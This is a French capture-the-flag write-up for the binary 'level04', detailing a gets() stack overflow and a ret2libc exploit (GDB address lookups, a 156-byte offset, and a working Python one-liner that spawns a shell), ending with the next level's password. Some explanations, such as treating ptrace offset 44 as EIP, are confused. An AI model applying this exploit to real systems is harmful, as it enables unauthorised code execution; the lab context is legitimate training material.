
# 📘 Exploitation du binaire `level04`

## 🔍 Analyse du code décompilé

Le code décompilé nous montre un programme focalisé sur la gestion de processus avec `fork`, `ptrace`, et `prctl`.

### 🔧 Comportement global

* Un **processus parent** est créé via `fork()`.
* Le **parent** observe le **fils** à l'aide de `ptrace(PTRACE_PEEKUSER, ...)`.
* La ligne `prctl(1, 1);` dans le processus fils signifie que **si le parent meurt, le fils est aussi tué automatiquement**.
* Si le fils tente d'exécuter un `exec()` (comme `execve()`), le parent le détecte (via le code 11 correspondant à `SIGSEGV`) et l'arrête immédiatement avec `kill()`.

---

## 🎯 Objectif

L’objectif est d’obtenir un shell, **mais aucun appel à `system()` ou à `/bin/sh` n’est présent dans le binaire**. Même si un mot de passe ou un shellcode était correct, **le programme ne mènera pas à un shell naturellement**.

Toutefois, une ligne intrigue :

```c
gets(s);
```

Cela signifie :

* **Aucune protection de taille** sur l'entrée.
* La variable `s` a une taille de 128 octets (`char s[128]`).
* Donc, une **vulnérabilité de type stack buffer overflow** est présente.

---

## 🚫 Mauvaise piste : Shellcode

Lorsqu’on lance l’exécutable, il affiche :

```
Give me some shellcode, k
```

On serait tenté de fournir un shellcode, mais dans la boucle du parent, on trouve :

```c
while (v8 != 11)
```

Or :

* `v8` est récupéré avec `ptrace(..., 44, ...)`, ce qui correspond au **registre EIP** (ou RIP en 64-bit).
* `11` est le **numéro du syscall `execve`**.
* Si le parent voit un `execve`, il tue immédiatement le processus fils.

➡️ **Tout shellcode contenant un appel à `execve` est inutile.**

---

## ✅ Bonne piste : Overflow

Le champ `s` contient notre entrée utilisateur, copiée via `gets()`, sans contrôle.
Cela nous permet de faire un **overflow** et d’écraser le **retour de fonction (EIP)**.

### 🎯 Stratégie

On peut alors forger une fausse pile contenant :

```
[padding] + [adresse de system()] + [adresse de exit()] + [adresse de "/bin/sh"]
```

Ainsi, on détourne l'exécution vers `system("/bin/sh")`.

---

## 🔍 Recherche des adresses

Avec GDB :

```bash
(gdb) info function system
=> 0xf7e6aed0

(gdb) info function exit
=> 0xf7e5eb70

(gdb) find &system,+9999999,"/bin/sh"
=> 0xf7f897ec
```

---

## 🧪 Recherche de l'offset exact (padding)

Comme `s` a une taille de 128 octets, on teste successivement :

* `python -c 'print "A"*128'`
* ...
* Jusqu'à ce que le programme segfault à `156` caractères.

Donc, **le retour EIP est écrasé à 156 octets**.

---

## 🧨 Ligne de commande finale (Python 2, sans `import sys`)

```bash
(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level04
```

Détail :

* `"\xd0\xae\xe6\xf7"` → `system()`
* `"\x70\xeb\xe5\xf7"` → `exit()`
* `"\xec\x97\xf8\xf7"` → `"/bin/sh"`

---

## 🏁 Résultat final

```bash
$ whoami
level05
$ cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

---
